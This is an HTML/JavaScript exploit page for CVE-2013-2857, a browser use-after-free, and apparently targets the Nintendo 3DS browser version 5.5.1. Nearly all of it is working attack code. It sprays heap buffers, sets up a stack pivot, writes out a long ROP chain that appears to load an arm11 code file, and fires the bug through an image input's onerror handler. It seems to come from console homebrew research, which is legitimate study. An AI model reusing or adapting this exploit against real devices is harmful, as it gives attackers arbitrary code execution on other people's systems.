<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash
types=["checkbox","color","date","datetime-local","email","file","hidden","image","month","number","password","radio","range","reset","search","submit","tel","text","time","url","week"]
-->
<script>
function UaF3(a)
{
	var bsize=0x2000000;
	var p = new ArrayBuffer(bsize); 
	var payload = new Uint32Array(p);

	payload[(0x1ba000+0x18)/4]=0x09300000;
	payload[(0x1ba000)/4]=0x09300000;
	payload[(0x1ba000+0x14c)/4]=0x00ac144c; //ldmdb r0!, {ip, sp, lr, pc} (stack pivot)
	payload[(0x1ba000-0x4)/4]=0x001df694;	//POP_PC   (pivot pc)
	payload[(0x1ba000-0x8)/4]=0x44444444;	//GARBAGE  (lr)
	payload[(0x1ba000-0xC)/4]=0x09310000;	//ROP_ADDR (pivot sp)

	var rop=[  				/* Generated from: https://github.com/yellows8/3ds_browserhax_common */
	0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x0100ffff, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0022681c, 0x0027b660, 0x001df694, 0x001df878, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00298814, 0x0027b660, 0x001df694, 0x001df878, 0x3a45c000, 0x00010000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00d1042c, 0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x636d6473, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0022681c, 0x0027b660, 0x001df694, 0x001df878, 0x09320004, 0x0000003a, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0022681c, 0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00319458, 0x00262c7c, 0x00000000, 0x0027b660, 0x001df878, 0x001df878, 0x09320000, 0x0a000000, 0x00000000, 0x00800000, 0x00000000, 0x00000000, 0x00000000, 0x002639ec, 0x00000001, 0x00000000, 0x00000000, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x00000014, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00d1042c, 0x0030ca50, 0x09320010, 0x00640073, 0x0063006d, 0x002f003a, 0x00720061, 0x0031006d, 0x00630031, 0x0064006f, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0030ca50, 0x0932002c, 0x002e0065, 0x00690062, 0x0000006e, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x09320040, 0x09320010, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00d1044c, 0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x09320040, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00322a0c, 0x00262c7c, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x09320020, 0x3a45d000, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x0030cb74, 0x00262c7c, 0x00000000, 0x00297374, 0x09320000, 0x0027b660, 0x001df694, 0x001f792c, 0x0027b660, 0x001df694, 0x001dce58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001ec6a8, 0x0027b660, 0x001df694, 0x001df878, 0x3a45d000, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0029dfec, 0x0030ca50, 0x09320010, 0x00000000, 0x001f1ed4, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x001eab84, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0030ca50, 0x0932002c, 0x002a29a8, 0x0029dfec, 0x00322a0c, 0x001ec6a8, 0x001f1f04, 0x00000000, 0x00000000, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x3a45c000, 0x09320010, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00d1044c, 0x0030ca50, 0x09320010, 0x00000000, 0x0030cb74, 0x00327980, 0x00298814, 0x00000000, 0x00000000, 0x00000048, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0030ca50, 0x0932002c, 0x00000000, 0x00000000, 0x00000000, 0x003e03d0, 0x00000114, 0x00000000, 0x00000000, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x3a45c030, 0x09320010, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00d1044c, 0x0030ca50, 0x09320010, 0x00000000, 0x3a45d000, 0x0063a738, 0x00d11044, 0x00d10ba4, 0x00d111b4, 0x00d10bac, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0030ca50, 0x0932002c, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0076e6cd, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x3a45c060, 0x09320010, 0x00000030, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00d1044c, 0x0027b660, 0x001df878, 0x001df878, 0x3a45d000, 0x3b1336e0, 0x00008000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x002a29a8, 0x00000000, 0x00000000, 0x00000000, 0x00000008, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x001df878, 0x3b9aca00, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x002d91e4, 0x0027b660, 0x001df694, 0x001df878, 0x09320000, 0x01808080, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0022681c, 0x0027b660, 0x001df878, 0x001df878, 0x00202a04, 0x09320000, 0x00000004, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00298814, 0x3a45c000, 0x0fff9000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0027b660, 0x001df694, 0x0055b6e0, 0x70707070
	]

	for(var i=0; i < rop.length; i++) payload[(0x1ba000+0x10000+(i*4))/4]=rop[i];
	
	for(var i=0;i<1000;i++){
		var buf = new ArrayBuffer(0x18);
		var bufView = new Uint32Array(buf);
		bufView[0]=0x11131100;
		bufView[1]=0x09300000; //r5
		bufView[2]=0x39010018; //r6
		bufView[3]=0x44161400;
		bufView[4]=0xffffffff;
		bufView[5]=0x66181600;
		a.type="hidden";
	}
}
</script>
<input type="image" onerror="UaF3(this);" src=""/>